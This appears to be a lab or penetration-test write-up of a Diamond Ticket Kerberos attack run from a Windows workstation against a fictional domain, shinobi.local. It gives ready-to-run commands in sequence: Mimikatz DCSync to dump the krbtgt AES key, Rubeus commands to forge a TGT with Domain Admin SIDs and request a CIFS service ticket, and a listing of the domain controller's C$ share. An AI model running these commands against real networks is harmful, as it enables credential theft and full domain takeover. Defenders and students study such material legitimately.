Diamond Ticket Attack (Windows Local Execution)

  1. 1.

    1. Concept & Objective

Objective: To execute the Diamond Ticket forgery natively on a compromised Windows workstation (WRS01) using C#-based tooling, injecting a highly evasive, modified Ticket Granting Ticket (TGT) directly into the local Kerberos cache.

Concept: Instead of forging a TGT from scratch offline (like a Golden Ticket), the local execution uses Rubeus to actively communicate with the Domain Controller. It authenticates as a standard user to request a legitimate TGT, intercepts that TGT in memory, decrypts it using the stolen krbtgt AES key, injects administrative group SIDs (like Domain Admins) into the PAC, re-encrypts it, and submits it to the local LSA.

  1. 2.

    2. Prerequisites (Credential Extraction)

To perform the Diamond Ticket attack locally, the AES-256 key of the krbtgt account is required to decrypt and re-encrypt the legitimate TGT.

Step 1: Extracting KDC Secrets (Mimikatz)

Tool: mimikatz.exe

Command:

mimikatz # privilege::debug

mimikatz # lsadump::dcsync /domain:shinobi.local /user:krbtgt

Findings: By executing a DCSync attack via Mimikatz, we successfully extracted the encryption keys for the KDC service account. Specifically, we obtained the required aes256_hmac key: 297d8e7974352d17756e706cf95ee68267732ff07bc877a422102da0f2aee939.

  1. 3.

    3. Attack Execution: The Diamond Forgery (Rubeus)

Objective: Request a valid TGT for naruto_uzumaki07, modify its PAC to grant elevated privileges, and inject it into the session.

Step 1: Forging the TGT

Tool: Rubeus.exe

Command:

.\Rubeus.exe diamond /krbkey:297d8e7974352d17756e706cf95ee68267732ff07bc877a422102da0f2aee939 /user:naruto_uzumaki07 /password:Konoha@123 /enctype:aes /domain:shinobi.local /dc:dc01.shinobi.local /ticketuser:naruto_uzumaki07 /ptt /nowrap

Findings:

  1. Legitimate Request: Rubeus successfully initiated a legitimate AS-REQ (with pre-authentication) against DC01 for the user naruto_uzumaki07. This ensures an Event 4768 is logged on the KDC, satisfying the requirement for an OPSEC-safe ticket.

  1. The Modification: Rubeus intercepted the response, decrypting the TGT, retrieving and modifying the PAC, and re-encrypting the payload. 3. Injection: The /ptt flag successfully imported the highly privileged Diamond TGT into the local session.

  1. 4.

    4. Weaponization & Verification

Objective: Utilize the injected Diamond TGT to request a Service Ticket (TGS) for the Domain Controller's file system and prove administrative access.

Step 1: Requesting the Service Ticket (TGS)

Tool: Rubeus.exe

Command:

.\Rubeus.exe asktgs /ticket:<base64_diamond_tgt> /service:cifs/dc01.shinobi.local /ptt /nowrap

Findings: We submitted the forged Diamond TGT back to the KDC to request a service ticket (TGS-REQ) for the cifs service on DC01. The KDC accepted the forged PAC and successfully granted the service ticket, which was imported into memory.

Step 2: Checking the Local Cache

Command: klist

Findings: The Kerberos cache confirms the presence of the krbtgt ticket (the Diamond TGT) and the newly requested cifs/dc01.shinobi.local service ticket, both utilizing AES-256 encryption.

Step 3: Final Access Verification

Command: dir \\dc01.shinobi.local\c$

Findings: Executing a standard directory listing from the workstation successfully returned the contents of the Domain Controller's C$ share, including sensitive folders like Windows, Users, and Shinobi_backup. This confirms that the standard user account naruto_uzumaki07 is now operating with Domain Admin privileges via the Diamond Ticket.
